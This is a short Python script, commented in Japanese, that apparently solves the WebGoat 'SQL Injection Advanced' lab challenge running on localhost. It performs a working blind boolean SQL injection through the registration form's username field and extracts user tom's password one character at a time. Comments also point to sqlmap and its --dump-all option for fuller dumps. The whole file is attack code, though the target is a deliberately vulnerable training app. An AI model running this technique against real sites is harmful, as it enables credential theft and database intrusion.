import json
import requests

def sql_injection_adv_5():
    alphabet_index =0
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    passwd_index = 1
    #substringは第2引数nとおくとn文字目を意味する。index0番目は1文字目として扱われるらしい?
    passwd =''

    headers={
        'Cookie': 'JSESSIONID=BBElpIBK14OiaB4Cd0f8CwVIhK6KNt_j43RRJo-x'
        # 'Cookie': 'JSESSIONID=hrY1H16D4yk_NqheEs2CgzBaNX8tQ-3wL8dICOjQ' 
        # Example here ^
    }
    #インスペクターなどを使用しクッキーの数値を取得し貼り付けること
    #下のrequests.put()内で指定するURLと対応するCOOKIEのJSESSIONID

    while True:
        payload ='tom\' AND substring(PASSWORD,{},1)=\'{}'.format(passwd_index,alphabet[alphabet_index])
        #payloadの内容は    tom' AND substring(PASSWORD,{},1)='{}   となる
        #{}の内容は.formatによって設定される。要はCのprintfの%dとそれに対応するint変数みたいなもの
        
        #名前がtomであることは知っている
        #名前がtomであることとPASSWORDの指定文字目が指定したalphabet[alphabet_index]であることの両方がtrueであれば全体の条件式がTRUEを返しalready exist...を返す
        #substring(string,int0,int1) stringのint0文字目を先頭としてint1文字を取得して返す
        
        #WARNING テーブル名がpasswordとわかっている前提のもとのかなり天下りなやり方(成功はする)
        #WARNING sqlmapの使用方法を調べそちらでexploitするべき
        #https://github.com/vernjan/webgoat/blob/master/01-sqli_advanced.md <=参考
        #ここで存在するDBリスト取得->DB内のテーブルリスト->テーブルのカラム検索でテーブル名を検索すればpasswdカラムの存在を確認できる
        #あるいは--dump-allを使ってすべてのTABLEのカラムを検索しながらダンプを試みるとか
        
        data = {
            'username_reg':payload,
            'email_reg':'mail@email.com',
            'password_reg':'pass',
            'confirm_password_reg':'pass'
        }

        r= requests.put('http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=headers, data=data,timeout=(100,100))
        #実際使うならtimeoutの数値はもっと考えたほうがいい
        #第一引数で指定するのは接続するURL,インスペクターを使って表示中のページではなくPUTなどを行うときに使うURLを指定すること
        try:
            response =json.loads(r.text)
        except:
            print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
            return

        if "already exists please try to register with a different username" not in response['feedback']:
            alphabet_index += 1
            if alphabet_index > len(alphabet) -1:
                print('Finished (or overflow)')
                return
        else:
            passwd += alphabet[alphabet_index]
            print(passwd)
            alphabet_index=0
            passwd_index +=1

sql_injection_adv_5()

		
